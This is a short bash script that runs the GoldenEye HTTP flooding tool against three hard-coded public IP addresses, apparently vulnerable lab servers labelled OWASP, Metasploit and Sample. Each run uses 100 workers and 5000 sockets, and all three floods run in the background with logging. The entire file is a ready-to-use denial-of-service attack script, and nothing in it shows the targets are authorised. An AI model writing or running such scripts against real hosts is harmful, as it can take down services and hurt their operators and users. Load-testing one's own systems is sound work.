#!/bin/bash
# Multi-target GoldenEye tester

# Target servers
OWASP_SERVER="https://41.89.1.169"
METASPLOIT_SERVER="https://41.204.167.98"
SAMPLE_SERVER="https://41.89.1.170"

# GoldenEye settings
WORKERS=100
SOCKETS=5000
METHOD="random"
DEBUG="-d"
NOSSL="-n"

# Create a log directory
LOGDIR="./logs"
mkdir -p $LOGDIR

# Test OWASP server
echo "[*] Attacking server..."
python3 goldeneye.py $OWASP_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL > $LOGDIR/owasp.log 2>&1 &
PID1=$!

# Wait a bit between tests
sleep 5

# Test Metasploit server
echo "[*] Attacking  server..."
python3 goldeneye.py $METASPLOIT_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL > $LOGDIR/metasploit.log 2>&1 &
PID2=$!

sleep 5

# Test Sample server
echo "[*] Attacking  server..."
python3 goldeneye.py $SAMPLE_SERVER -w $WORKERS -s $SOCKETS -m $METHOD $DEBUG $NOSSL > $LOGDIR/sample.log 2>&1 &
PID3=$!

# Summary
echo "[*] Tests running in background. Monitor with: tail -f $LOGDIR/*.log"
echo "[*] To stop all tests: kill $PID1 $PID2 $PID3"

